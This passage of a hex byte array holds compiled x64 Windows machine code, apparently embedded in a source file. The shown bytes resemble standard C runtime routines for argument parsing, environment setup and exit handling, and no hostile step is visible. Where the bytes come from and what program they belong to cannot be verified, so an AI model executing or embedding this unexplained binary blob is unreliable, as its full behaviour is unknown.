0x4d, 0xd0, 0xe8, 0x51, 0xfe, 0xff, 0xff, 0x90, 0x83, 0x7d, 0x20, 0x0, 0x74, 0xb, 0x48, 0x8b, 0x5c, 0x24, 0x60, 0x48, 0x83, 0xc4, 0x50, 0x5d, 0xc3, 0x8b, 0xcb, 0xe8, 0x4, 0x0, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x8b, 0xd9, 0xe8, 0x27, 0x0, 0x0, 0x0, 0x84, 0xc0, 0x74, 0x11, 0xff, 0x15, 0xc9, 0x9f, 0x0, 0x0, 0x48, 0x8b, 0xc8, 0x8b, 0xd3, 0xff, 0x15, 0xce, 0x9f, 0x0, 0x0, 0x8b, 0xcb, 0xe8, 0x3b, 0x0, 0x0, 0x0, 0x8b, 0xcb, 0xff, 0x15, 0xb7, 0x9f, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0xbb, 0x14, 0x0, 0x0, 0x83, 0xf8, 0x1, 0x74, 0x1b, 0x65, 0x48, 0x8b, 0xc, 0x25, 0x60, 0x0, 0x0, 0x0, 0x8b, 0x91, 0xbc, 0x0, 0x0, 0x0, 0xc1, 0xea, 0x8, 0xf6, 0xc2, 0x1, 0x75, 0x4, 0xb0, 0x1, 0xeb, 0x2, 0x32, 0xc0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x40, 0x53, 0x48, 0x83, 0xec, 0x30, 0x48, 0xc7, 0x44, 0x24, 0x20, 0xfe, 0xff, 0xff, 0xff, 0x8b, 0xd9, 0x48, 0x83, 0x64, 0x24, 0x48, 0x0, 0x4c, 0x8d, 0x44, 0x24, 0x48, 0x48, 0x8d, 0x15, 0x81, 0xb2, 0x0, 0x0, 0x33, 0xc9, 0xff, 0x15, 0x69, 0x9f, 0x0, 0x0, 0x48, 0x8b, 0x4c, 0x24, 0x48, 0x85, 0xc0, 0x74, 0x29, 0x48, 0x8d, 0x15, 0x81, 0xb2, 0x0, 0x0, 0xff, 0x15, 0x13, 0x9f, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x12, 0x49, 0xba, 0x70, 0x7b, 0x5a, 0x5e, 0x9b, 0x87, 0x1, 0xa2, 0x8b, 0xcb, 0xff, 0x15, 0x7c, 0xa0, 0x0, 0x0, 0x48, 0x8b, 0x4c, 0x24, 0x48, 0x48, 0x85, 0xc9, 0x74, 0x7, 0xff, 0x15, 0xe4, 0x9e, 0x0, 0x0, 0x90, 0x48, 0x83, 0xc4, 0x30, 0x5b, 0xc3, 0xcc, 0x48, 0x89, 0xd, 0x25, 0x4b, 0x1, 0x0, 0xc3, 0x33, 0xd2, 0x33, 0xc9, 0x44, 0x8d, 0x42, 0x1, 0xe9, 0x4f, 0xfe, 0xff, 0xff, 0xcc, 0xcc, 0xcc, 0x45, 0x33, 0xc0, 0x41, 0x8d, 0x50, 0x2, 0xe9, 0x40, 0xfe, 0xff, 0xff, 0x8b, 0x5, 0xfa, 0x4a, 0x1, 0x0, 0xc3, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x20, 0x4c, 0x8b, 0x7c, 0x24, 0x60, 0x4d, 0x8b, 0xe1, 0x49, 0x8b, 0xd8, 0x4c, 0x8b, 0xf2, 0x48, 0x8b, 0xf9, 0x49, 0x83, 0x27, 0x0, 0x49, 0xc7, 0x1, 0x1, 0x0, 0x0, 0x0, 0x48, 0x85, 0xd2, 0x74, 0x7, 0x48, 0x89, 0x1a, 0x49, 0x83, 0xc6, 0x8, 0x40, 0x32, 0xed, 0x80, 0x3f, 0x22, 0x75, 0xf, 0x40, 0x84, 0xed, 0x40, 0xb6, 0x22, 0x40, 0xf, 0x94, 0xc5, 0x48, 0xff, 0xc7, 0xeb, 0x37, 0x49, 0xff, 0x7, 0x48, 0x85, 0xdb, 0x74, 0x7, 0x8a, 0x7, 0x88, 0x3, 0x48, 0xff, 0xc3, 0xf, 0xbe, 0x37, 0x48, 0xff, 0xc7, 0x8b, 0xce, 0xe8, 0x18, 0x32, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x12, 0x49, 0xff, 0x7, 0x48, 0x85, 0xdb, 0x74, 0x7, 0x8a, 0x7, 0x88, 0x3, 0x48, 0xff, 0xc3, 0x48, 0xff, 0xc7, 0x40, 0x84, 0xf6, 0x74, 0x1c, 0x40, 0x84, 0xed, 0x75, 0xb0, 0x40, 0x80, 0xfe, 0x20, 0x74, 0x6, 0x40, 0x80, 0xfe, 0x9, 0x75, 0xa4, 0x48, 0x85, 0xdb, 0x74, 0x9, 0xc6, 0x43, 0xff, 0x0, 0xeb, 0x3, 0x48, 0xff, 0xcf, 0x40, 0x32, 0xf6, 0x8a, 0x7, 0x84, 0xc0, 0xf, 0x84, 0xd4, 0x0, 0x0, 0x0, 0x3c, 0x20, 0x74, 0x4, 0x3c, 0x9, 0x75, 0x7, 0x48, 0xff, 0xc7, 0x8a, 0x7, 0xeb, 0xf1, 0x84, 0xc0, 0xf, 0x84, 0xbd, 0x0, 0x0, 0x0, 0x4d, 0x85, 0xf6, 0x74, 0x7, 0x49, 0x89, 0x1e, 0x49, 0x83, 0xc6, 0x8, 0x49, 0xff, 0x4, 0x24, 0xba, 0x1, 0x0, 0x0, 0x0, 0x33, 0xc0, 0xeb, 0x5, 0x48, 0xff, 0xc7, 0xff, 0xc0, 0x8a, 0xf, 0x80, 0xf9, 0x5c, 0x74, 0xf4, 0x80, 0xf9, 0x22, 0x75, 0x30, 0x84, 0xc2, 0x75, 0x18, 0x40, 0x84, 0xf6, 0x74, 0xa, 0x38, 0x4f, 0x1, 0x75, 0x5, 0x48, 0xff, 0xc7, 0xeb, 0x9, 0x33, 0xd2, 0x40, 0x84, 0xf6, 0x40, 0xf, 0x94, 0xc6, 0xd1, 0xe8, 0xeb, 0x10, 0xff, 0xc8, 0x48, 0x85, 0xdb, 0x74, 0x6, 0xc6, 0x3, 0x5c, 0x48, 0xff, 0xc3, 0x49, 0xff, 0x7, 0x85, 0xc0, 0x75, 0xec, 0x8a, 0x7, 0x84, 0xc0, 0x74, 0x46, 0x40, 0x84, 0xf6, 0x75, 0x8, 0x3c, 0x20, 0x74, 0x3d, 0x3c, 0x9, 0x74, 0x39, 0x85, 0xd2, 0x74, 0x2d, 0x48, 0x85, 0xdb, 0x74, 0x7, 0x88, 0x3, 0x48, 0xff, 0xc3, 0x8a, 0x7, 0xf, 0xbe, 0xc8, 0xe8, 0x31, 0x31, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x12, 0x49, 0xff, 0x7, 0x48, 0xff, 0xc7, 0x48, 0x85, 0xdb, 0x74, 0x7, 0x8a, 0x7, 0x88, 0x3, 0x48, 0xff, 0xc3, 0x49, 0xff, 0x7, 0x48, 0xff, 0xc7, 0xe9, 0x66, 0xff, 0xff, 0xff, 0x48, 0x85, 0xdb, 0x74, 0x6, 0xc6, 0x3, 0x0, 0x48, 0xff, 0xc3, 0x49, 0xff, 0x7, 0xe9, 0x22, 0xff, 0xff, 0xff, 0x4d, 0x85, 0xf6, 0x74, 0x4, 0x49, 0x83, 0x26, 0x0, 0x49, 0xff, 0x4, 0x24, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x6c, 0x24, 0x48, 0x48, 0x8b, 0x74, 0x24, 0x50, 0x48, 0x8b, 0x7c, 0x24, 0x58, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5c, 0xc3, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x1f, 0x4c, 0x8b, 0xca, 0x48, 0x3b, 0xc8, 0x73, 0x3d, 0x33, 0xd2, 0x48, 0x83, 0xc8, 0xff, 0x49, 0xf7, 0xf0, 0x4c, 0x3b, 0xc8, 0x73, 0x2f, 0x48, 0xc1, 0xe1, 0x3, 0x4d, 0xf, 0xaf, 0xc8, 0x48, 0x8b, 0xc1, 0x48, 0xf7, 0xd0, 0x49, 0x3b, 0xc1, 0x76, 0x1c, 0x49, 0x3, 0xc9, 0xba, 0x1, 0x0, 0x0, 0x0, 0xe8, 0x12, 0x17, 0x0, 0x0, 0x33, 0xc9, 0x48, 0x8b, 0xd8, 0xe8, 0x80, 0x17, 0x0, 0x0, 0x48, 0x8b, 0xc3, 0xeb, 0x2, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x55, 0x56, 0x57, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x30, 0x33, 0xff, 0x44, 0x8b, 0xf1, 0x85, 0xc9, 0xf, 0x84, 0x53, 0x1, 0x0, 0x0, 0x8d, 0x41, 0xff, 0x83, 0xf8, 0x1, 0x76, 0x16, 0xe8, 0xab, 0x16, 0x0, 0x0, 0x8d, 0x5f, 0x16, 0x89, 0x18, 0xe8, 0x65, 0x15, 0x0, 0x0, 0x8b, 0xfb, 0xe9, 0x35, 0x1, 0x0, 0x0, 0xe8, 0x7d, 0x2c, 0x0, 0x0, 0x48, 0x8d, 0x1d, 0xa6, 0x48, 0x1, 0x0, 0x41, 0xb8, 0x4, 0x1, 0x0, 0x0, 0x48, 0x8b, 0xd3, 0x33, 0xc9, 0xe8, 0x4a, 0x23, 0x0, 0x0, 0x48, 0x8b, 0x35, 0x6f, 0x4c, 0x1, 0x0, 0x48, 0x89, 0x1d, 0x48, 0x4c, 0x1, 0x0, 0x48, 0x85, 0xf6, 0x74, 0x5, 0x40, 0x38, 0x3e, 0x75, 0x3, 0x48, 0x8b, 0xf3, 0x48, 0x8d, 0x45, 0x48, 0x48, 0x89, 0x7d, 0x40, 0x4c, 0x8d, 0x4d, 0x40, 0x48, 0x89, 0x44, 0x24, 0x20, 0x45, 0x33, 0xc0, 0x48, 0x89, 0x7d, 0x48, 0x33, 0xd2, 0x48, 0x8b, 0xce, 0xe8, 0x49, 0xfd, 0xff, 0xff, 0x4c, 0x8b, 0x7d, 0x40, 0x41, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x55, 0x48, 0x49, 0x8b, 0xcf, 0xe8, 0xf3, 0xfe, 0xff, 0xff, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x75, 0x18, 0xe8, 0x1e, 0x16, 0x0, 0x0, 0xbb, 0xc, 0x0, 0x0, 0x0, 0x33, 0xc9, 0x89, 0x18, 0xe8, 0xa8, 0x16, 0x0, 0x0, 0xe9, 0x6a, 0xff, 0xff, 0xff, 0x4e, 0x8d, 0x4, 0xf8, 0x48, 0x8b, 0xd3, 0x48, 0x8d, 0x45, 0x48, 0x48, 0x8b, 0xce, 0x4c, 0x8d, 0x4d, 0x40, 0x48, 0x89, 0x44, 0x24, 0x20, 0xe8, 0xf7, 0xfc, 0xff, 0xff, 0x41, 0x83, 0xfe, 0x1, 0x75, 0x16, 0x8b, 0x45, 0x40, 0xff, 0xc8, 0x48, 0x89, 0x1d, 0xc5, 0x4b, 0x1, 0x0, 0x89, 0x5, 0xb7, 0x4b, 0x1, 0x0, 0x33, 0xc9, 0xeb, 0x69, 0x48, 0x8d, 0x55, 0x38, 0x48, 0x89, 0x7d, 0x38, 0x48, 0x8b, 0xcb, 0xe8, 0x6b, 0x21, 0x0, 0x0, 0x8b, 0xf0, 0x85, 0xc0, 0x74, 0x19, 0x48, 0x8b, 0x4d, 0x38, 0xe8, 0x4c, 0x16, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0x48, 0x89, 0x7d, 0x38, 0xe8, 0x40, 0x16, 0x0, 0x0, 0x8b, 0xfe, 0xeb, 0x3f, 0x48, 0x8b, 0x55, 0x38, 0x48, 0x8b, 0xcf, 0x48, 0x8b, 0xc2, 0x48, 0x39, 0x3a, 0x74, 0xc, 0x48, 0x8d, 0x40, 0x8, 0x48, 0xff, 0xc1, 0x48, 0x39, 0x38, 0x75, 0xf4, 0x89, 0xd, 0x63, 0x4b, 0x1, 0x0, 0x33, 0xc9, 0x48, 0x89, 0x7d, 0x38, 0x48, 0x89, 0x15, 0x5e, 0x4b, 0x1, 0x0, 0xe8, 0x9, 0x16, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0x48, 0x89, 0x7d, 0x38, 0xe8, 0xfd, 0x15, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x60, 0x8b, 0xc7, 0x48, 0x83, 0xc4, 0x30, 0x41, 0x5f, 0x41, 0x5e, 0x5f, 0x5e, 0x5d, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x33, 0xff, 0x48, 0x39, 0x3d, 0x5d, 0x48, 0x1, 0x0, 0x74, 0x4, 0x33, 0xc0, 0xeb, 0x4f, 0xe8, 0x1a, 0x2b, 0x0, 0x0, 0xe8, 0xd, 0x30, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x75, 0xc, 0x33, 0xc9, 0xe8, 0xb6, 0x15, 0x0, 0x0, 0x83, 0xc8, 0xff, 0xeb, 0x31, 0x48, 0x8b, 0xcb, 0xe8, 0x35, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x75, 0x5, 0x83, 0xcf, 0xff, 0xeb, 0xe, 0x48, 0x89, 0x5, 0x38, 0x48, 0x1, 0x0, 0x48, 0x89, 0x5, 0x19, 0x48, 0x1, 0x0, 0x33, 0xc9, 0xe8, 0x8a, 0x15, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0xe8, 0x82, 0x15, 0x0, 0x0, 0x8b, 0xc7, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec, 0x30, 0x48, 0x8b, 0xf1, 0x33, 0xc9, 0x4c, 0x8b, 0xc6, 0x8a, 0x16, 0xeb, 0x25, 0x80, 0xfa, 0x3d, 0x48, 0x8d, 0x41, 0x1, 0x48, 0xf, 0x44, 0xc1, 0x48, 0x8b, 0xc8, 0x48, 0x83, 0xc8, 0xff, 0x48, 0xff, 0xc0, 0x41, 0x80, 0x3c, 0x0, 0x0, 0x75, 0xf6, 0x49, 0xff, 0xc0, 0x4c, 0x3, 0xc0, 0x41, 0x8a, 0x10, 0x84, 0xd2, 0x75, 0xd7, 0x48, 0xff, 0xc1, 0xba, 0x8, 0x0, 0x0, 0x0, 0xe8, 0xa1, 0x14, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x75, 0xb, 0x33, 0xc9, 0xe8, 0xa, 0x15, 0x0, 0x0, 0x33, 0xc0, 0xeb, 0x72, 0x4c, 0x8b, 0xf3, 0x8a, 0x6, 0x84, 0xc0, 0x74, 0x5f, 0x48, 0x83, 0xcd, 0xff, 0x48, 0xff, 0xc5, 0x80, 0x3c, 0x2e, 0x0, 0x75, 0xf7, 0x48, 0xff, 0xc5, 0x3c, 0x3d, 0x74, 0x35, 0xba, 0x1, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xcd, 0xe8, 0x64, 0x14, 0x0, 0x0, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x74, 0x25, 0x4c, 0x8b, 0xc6, 0x48, 0x8b, 0xd5, 0x48, 0x8b, 0xc8, 0xe8, 0xea, 0x4, 0x0, 0x0, 0x33, 0xc9, 0x85, 0xc0, 0x75, 0x47, 0x49, 0x89, 0x3e, 0x49, 0x83, 0xc6, 0x8, 0xe8, 0xb4, 0x14, 0x0, 0x0, 0x48, 0x3, 0xf5, 0xeb, 0xac, 0x48, 0x8b, 0xcb, 0xe8, 0x43, 0x0, 0x0, 0x0, 0x33, 0xc9, 0xe8, 0xa0, 0x14, 0x0, 0x0, 0xeb, 0x8d, 0x33, 0xc9, 0xe8, 0x97, 0x14, 0x0, 0x0, 0x48, 0x8b, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x6c, 0x24, 0x48, 0x48, 0x8b, 0x74, 0x24, 0x50, 0x48, 0x8b, 0x7c, 0x24, 0x58, 0x48, 0x83, 0xc4, 0x30, 0x41, 0x5e, 0xc3, 0x48, 0x83, 0x64, 0x24, 0x20, 0x0, 0x45, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0xe8, 0xb2, 0x12, 0x0, 0x0, 0xcc, 0xcc, 0x48, 0x85, 0xc9, 0x74, 0x3b, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0x1, 0x48, 0x8b, 0xd9, 0x48, 0x8b, 0xf9, 0xeb, 0xf, 0x48, 0x8b, 0xc8, 0xe8, 0x42, 0x14, 0x0, 0x0, 0x48, 0x8d, 0x7f, 0x8, 0x48, 0x8b, 0x7, 0x48, 0x85, 0xc0, 0x75, 0xec, 0x48, 0x8b, 0xcb, 0xe8, 0x2e, 0x14, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8b, 0x9, 0x48, 0x3b, 0xd, 0xb2, 0x46, 0x1, 0x0, 0x74, 0x5, 0xe8, 0xa7, 0xff, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8b, 0x9, 0x48, 0x3b, 0xd, 0x8e, 0x46, 0x1, 0x0, 0x74, 0x5, 0xe8, 0x8b, 0xff, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x38, 0x48, 0xc7, 0x44, 0x24, 0x20, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x8d, 0xd, 0x5c, 0x46, 0x1, 0x0, 0xe8, 0xaf, 0xff, 0xff, 0xff, 0x90, 0x48, 0x8d, 0xd, 0x57, 0x46, 0x1, 0x0, 0xe8, 0xbe, 0xff, 0xff, 0xff, 0x90, 0x48, 0x8b, 0xd, 0x5a, 0x46, 0x1, 0x0, 0xe8, 0x51, 0xff, 0xff, 0xff, 0x48, 0x8b, 0xd, 0x46, 0x46, 0x1, 0x0, 0x48, 0x83, 0xc4, 0x38, 0xe9, 0x41, 0xff, 0xff, 0xff, 0xcc, 0xe9, 0xb7, 0xfd, 0xff, 0xff, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xd9, 0x49, 0x8b, 0xf8, 0x8b, 0xa, 0xe8, 0x78, 0xd, 0x0, 0x0, 0x90, 0x48, 0x8b, 0xcf, 0xe8, 0x17, 0x0, 0x0, 0x0, 0x8b, 0xf8, 0x8b, 0xb, 0xe8, 0xba, 0xd, 0x0, 0x0, 0x8b, 0xc7, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0x1, 0x48, 0x8b, 0xf1, 0x48, 0x8b, 0x18, 0x48, 0x85, 0xdb, 0x75, 0x8, 0x83, 0xc8, 0xff, 0xe9, 0xd9, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x3b, 0x4c, 0x8b, 0x5, 0x48, 0x38, 0x1, 0x0, 0x48, 0x8b, 0x5b, 0x8, 0x49, 0x33, 0xf8, 0x49, 0x33, 0xd8, 0x41, 0x8b, 0xc8, 0x83, 0xe1, 0x3f, 0x48, 0xd3, 0xcf, 0x48, 0xd3, 0xcb, 0x48, 0x8d, 0x47, 0xff, 0x48, 0x83, 0xf8, 0xfd, 0xf, 0x87, 0xa9, 0x0, 0x0, 0x0, 0x41, 0x8b, 0xc8, 0x4d, 0x8b, 0xf0, 0x83, 0xe1, 0x3f, 0x4c, 0x8b, 0xff, 0x48, 0x8b, 0xeb, 0x48, 0x83, 0xeb, 0x8, 0x48, 0x3b, 0xdf, 0x72, 0x5f, 0x48, 0x8b, 0x3, 0x49, 0x3b, 0xc6, 0x74, 0xef, 0x49, 0x33, 0xc0, 0x4c, 0x89, 0x33, 0x48, 0xd3, 0xc8, 0x49, 0xba, 0x70, 0x48, 0xda, 0x56, 0x96, 0x3e, 0xf1, 0x85, 0xff, 0x15, 0x73, 0x99, 0x0, 0x0, 0x4c, 0x8b, 0x5, 0xe4, 0x37, 0x1, 0x0, 0x48, 0x8b, 0x6, 0x41, 0x8b, 0xc8, 0x83, 0xe1, 0x3f, 0x48, 0x8b, 0x10, 0x4c, 0x8b, 0xa, 0x48, 0x8b, 0x42, 0x8, 0x4d, 0x33, 0xc8, 0x49, 0x33, 0xc0, 0x49, 0xd3, 0xc9, 0x48, 0xd3, 0xc8, 0x4d, 0x3b, 0xcf, 0x75, 0x5, 0x48, 0x3b, 0xc5, 0x74, 0xa6, 0x4d, 0x8b, 0xf9, 0x49, 0x8b, 0xf9, 0x48, 0x8b, 0xe8, 0x48, 0x8b, 0xd8, 0xeb, 0x98, 0x48, 0x83, 0xff, 0xff, 0x74, 0xf, 0x48, 0x8b, 0xcf, 0xe8, 0x7f, 0x12, 0x0, 0x0, 0x4c, 0x8b, 0x5, 0x98, 0x37, 0x1, 0x0, 0x48, 0x8b, 0x6, 0x48, 0x8b, 0x8, 0x4c, 0x89, 0x1, 0x48, 0x8b, 0x6, 0x48, 0x8b, 0x8, 0x4c, 0x89, 0x41, 0x8, 0x48, 0x8b, 0x6, 0x48, 0x8b, 0x8, 0x4c, 0x89, 0x41, 0x10, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x6c, 0x24, 0x48, 0x48, 0x8b, 0x74, 0x24, 0x50, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5f, 0x41, 0x5e, 0x5f, 0xc3, 0x4c, 0x8b, 0xdc, 0x49, 0x89, 0x4b, 0x8, 0x48, 0x83, 0xec, 0x38, 0x49, 0xc7, 0x43, 0xf0, 0xfe, 0xff, 0xff, 0xff, 0x49, 0x8d, 0x43, 0x8, 0x49, 0x89, 0x43, 0xe8, 0xb8, 0x2, 0x0, 0x0, 0x0, 0x89, 0x44, 0x24, 0x50, 0x89, 0x44, 0x24, 0x58, 0x4d, 0x8d, 0x4b, 0x18, 0x4d, 0x8d, 0x43, 0xe8, 0x49, 0x8d, 0x53, 0x20, 0x49, 0x8d, 0x4b, 0x10, 0xe8, 0x67, 0xfe, 0xff, 0xff, 0x90, 0x48, 0x83, 0xc4, 0x38, 0xc3, 0xcc, 0x48, 0x85, 0xc9, 0x75, 0x4, 0x83, 0xc8, 0xff, 0xc3, 0x48, 0x8b, 0x41, 0x10, 0x48, 0x39, 0x1, 0x75, 0x12, 0x48, 0x8b, 0x5, 0x3, 0x37, 0x1, 0x0, 0x48, 0x89, 0x1, 0x48, 0x89, 0x41, 0x8, 0x48, 0x89, 0x41, 0x10, 0x33, 0xc0, 0xc3, 0xcc, 0x48, 0x8d, 0x5, 0x7d, 0x3c, 0x1, 0x0, 0x48, 0x89, 0x5, 0xe, 0x4d, 0x1, 0x0, 0xb0, 0x1, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8d, 0xd, 0x5d, 0x44, 0x1, 0x0, 0xe8, 0xb4, 0xff, 0xff, 0xff, 0x48, 0x8d, 0xd, 0x69, 0x44, 0x1, 0x0, 0xe8, 0xa8, 0xff, 0xff, 0xff, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xb0, 0x1, 0xc3, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0xa7, 0xfd, 0xff, 0xff, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0x1d, 0x9b, 0x36, 0x1, 0x0, 0x48, 0x8b, 0xcb, 0xe8, 0x2b, 0xe, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0xe8, 0x73, 0x35, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0xe8, 0x5b, 0x36, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0xe8, 0x13, 0x39, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0xe8, 0x97, 0xf7, 0xff, 0xff, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x33, 0xc9, 0xe9, 0xd9, 0xcb, 0xff, 0xff, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd, 0x63, 0x46, 0x1, 0x0, 0x83, 0xc8, 0xff, 0xf0, 0xf, 0xc1, 0x1, 0x83, 0xf8, 0x1, 0x75, 0x1f, 0x48, 0x8b, 0xd, 0x50, 0x46, 0x1, 0x0, 0x48, 0x8d, 0x1d, 0x89, 0x36, 0x1, 0x0, 0x48, 0x3b, 0xcb, 0x74, 0xc, 0xe8, 0xf, 0x11, 0x0, 0x0, 0x48, 0x89, 0x1d, 0x38, 0x46, 0x1, 0x0, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8b, 0xd, 0x55, 0x4c, 0x1, 0x0, 0xe8, 0xf0, 0x10, 0x0, 0x0, 0x48, 0x8b, 0xd, 0x51, 0x4c, 0x1, 0x0, 0x48, 0x83, 0x25, 0x41, 0x4c, 0x1, 0x0, 0x0, 0xe8, 0xdc, 0x10, 0x0, 0x0, 0x48, 0x8b, 0xd, 0x25, 0x46, 0x1, 0x0, 0x48, 0x83, 0x25, 0x35, 0x4c, 0x1, 0x0, 0x0, 0xe8, 0xc8, 0x10, 0x0, 0x0, 0x48, 0x8b, 0xd, 0x19, 0x46, 0x1, 0x0, 0x48, 0x83, 0x25, 0x9, 0x46, 0x1, 0x0, 0x0, 0xe8, 0xb4, 0x10, 0x0, 0x0, 0x48, 0x83, 0x25, 0x4, 0x46, 0x1, 0x0, 0x0, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0x48, 0x8d, 0x15, 0x8d, 0xaa, 0x0, 0x0, 0x48, 0x8d, 0xd, 0x86, 0xa9, 0x0, 0x0, 0xe9, 0xbd, 0x33, 0x0, 0x0, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x4f, 0x8, 0x0, 0x0, 0x48, 0x85, 0xc0, 0xf, 0x95, 0xc0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x7f, 0x6, 0x0, 0x0, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x83, 0xec, 0x28, 0x84, 0xc9, 0x74, 0x16, 0x48, 0x83, 0x3d, 0xb4, 0x4b, 0x1, 0x0, 0x0, 0x74, 0x5, 0xe8, 0x89, 0x3b, 0x0, 0x0, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x8d, 0x15, 0x37, 0xaa, 0x0, 0x0, 0x48, 0x8d, 0xd, 0x30, 0xa9, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x28, 0xe9, 0xf7, 0x33, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0xb7, 0x9, 0x0, 0x0, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x6b, 0x6, 0x0, 0x0, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x85, 0xc0, 0x74, 0x12, 0x49, 0xba, 0x70, 0x48, 0xda, 0x56, 0x96, 0x3e, 0xf1, 0x85, 0xff, 0x15, 0xaa, 0x96, 0x0, 0x0, 0xeb, 0x0, 0xe8, 0x7f, 0x0, 0x0, 0x0, 0x90, 0xcc, 0xcc, 0xc7, 0x44, 0x24, 0x10, 0x0, 0x0, 0x0, 0x0, 0x8b, 0x44, 0x24, 0x10, 0xe9, 0xe7, 0xf, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0xe9, 0xaf, 0x3c, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x33, 0xdb, 0x48, 0x85, 0xc9, 0x74, 0xc, 0x48, 0x85, 0xd2, 0x74, 0x7, 0x4d, 0x85, 0xc0, 0x75, 0x1b, 0x88, 0x19, 0xe8, 0x26, 0xf, 